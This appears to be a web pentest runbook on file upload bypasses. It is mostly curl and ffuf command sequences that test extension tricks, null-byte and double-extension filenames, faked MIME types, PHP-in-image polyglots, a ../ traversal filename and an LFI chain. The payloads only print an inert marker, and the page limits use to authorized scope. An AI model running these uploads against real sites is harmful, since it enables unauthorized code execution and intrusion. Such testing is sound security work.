---
title: "File Upload"
description: "Bypassing extension, content-type and magic-byte checks, filename traversal, web-accessible dirs, polyglots, and chaining uploads with LFI."
phase: Web
order: 33
tags:
  - file-upload
  - rce
  - web
  - bypass
tools:
  - burp suite
  - exiftool
updated: 2026-10-01
---

A file upload runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: map each validation layer, find a bypass, and prove impact with an inert marker file rather than a live webshell.

## 1. Map the validation layers

Upload a baseline file and observe every response — extension, MIME, size, and content checks.

```bash
# Baseline benign upload
curl -s -D - -b "session=YOURTOKEN" -F "file=@test.png" "https://target.com/upload"

# Compare rejections across file types
for ext in png jpg php phtml php5 jsp aspx; do
  cp test.png "test.$ext"
  code=$(curl -s -o /dev/null -w "%{http_code}" -b "session=YOURTOKEN" -F "file=@test.$ext" "https://target.com/upload")
  echo "$code test.$ext"
done
```

## 2. Probe extension bypasses

```bash
# Alternative extensions and case tricks
for ext in php phtml php3 php4 php5 php7 phps pht phar inc; do
  cp payload.png "shell.$ext"
  echo "$(curl -s -o /dev/null -w '%{http_code}' -b 'session=YOURTOKEN' -F "file=@shell.$ext" 'https://target.com/upload') shell.$ext"
done

# Double extension and trailing characters
for name in shell.php.png shell.php%00.png shell.php. shell.php.. shell.pHp $'shell.php\x00.png'; do
  cp payload.png "$name"
  echo "$(curl -s -o /dev/null -w '%{http_code}' -b 'session=YOURTOKEN' -F "file=@$name" 'https://target.com/upload') $name"
done
```

## 3. Bypass content-type and magic bytes

```bash
# Fake the MIME type
curl -s -D - -b "session=YOURTOKEN" \
  -F "file=@shell.php;type=image/png" "https://target.com/upload"

# Prepend a valid magic byte to a script
printf '\x89PNG\r\n\x1a\n<?php echo "MARKER"; ?>' > polyglot.png
curl -s -b "session=YOURTOKEN" -F "file=@polyglot.png;type=image/png" "https://target.com/upload"
```

## 4. Polyglot and metadata payloads

```bash
# Valid image that also parses as script (exiftool-driven)
exiftool -Comment='<?php echo "MARKER"; ?>' cover.jpg
cp cover.jpg polyglot.php.jpg
curl -s -b "session=YOURTOKEN" -F "file=@polyglot.php.jpg;type=image/jpeg" "https://target.com/upload"

# Check what the server kept
exiftool uploaded_file 2>/dev/null | grep -i comment
```

## 5. Filename traversal and web-accessible paths

```bash
# Traverse out of the upload dir (only if writable/dir listing revealed)
curl -s -b "session=YOURTOKEN" \
  -F "file=@marker.txt;filename=../../../../var/www/html/marker.txt" "https://target.com/upload"

# Locate where uploads are served
curl -s "https://target.com/uploads/" | head
for p in /uploads/ /files/ /media/ /static/uploads/; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' "https://target.com${p}marker.txt") $p"
done
```

## 6. Fuzz and chain with LFI

```bash
# Fuzz the upload endpoint itself
ffuf -u "https://target.com/upload" -X POST -H "Cookie: session=YOURTOKEN" \
  -F "file=@payload.png;filename=FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt -mc all

# If an LFI exists elsewhere, chain the uploaded file
curl -s "https://target.com/?page=../../../../var/www/html/uploads/polyglot.png" | head
```

## Full pipeline

```bash
# 1. Baseline and layer mapping
curl -s -D - -b "session=YOURTOKEN" -F "file=@test.png" "https://target.com/upload"
for ext in png jpg php phtml jsp aspx; do cp test.png "test.$ext"; echo "$(curl -s -o /dev/null -w '%{http_code}' -b 'session=YOURTOKEN' -F "file=@test.$ext" 'https://target.com/upload') test.$ext"; done

# 2. Extension bypasses
for ext in php phtml php5 pht phar; do cp payload.png "shell.$ext"; echo "$(curl -s -o /dev/null -w '%{http_code}' -b 'session=YOURTOKEN' -F "file=@shell.$ext" 'https://target.com/upload') shell.$ext"; done

# 3. Content-type and magic bytes
curl -s -D - -b "session=YOURTOKEN" -F "file=@shell.php;type=image/png" "https://target.com/upload"
printf '\x89PNG\r\n\x1a\n<?php echo "MARKER"; ?>' > polyglot.png

# 4. Metadata polyglot
exiftool -Comment='<?php echo "MARKER"; ?>' cover.jpg

# 5. Traversal and served paths
curl -s -b "session=YOURTOKEN" -F "file=@marker.txt;filename=../../../../var/www/html/marker.txt" "https://target.com/upload"
for p in /uploads/ /files/ /media/ /static/uploads/; do echo "$(curl -s -o /dev/null -w '%{http_code}' "https://target.com${p}marker.txt") $p"; done

# 6. Fuzz and chain
ffuf -u "https://target.com/upload" -X POST -H "Cookie: session=YOURTOKEN" -F "file=@payload.png;filename=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt -mc all
```

## Ethics & legality

- Only upload to endpoints within the authorized scope and use accounts you own.
- Use inert marker files; never deploy a functional webshell or persistence.
- Remove uploaded test files if the program expects cleanup.
- Preserve the upload request, server path, and retrieval response as evidence.
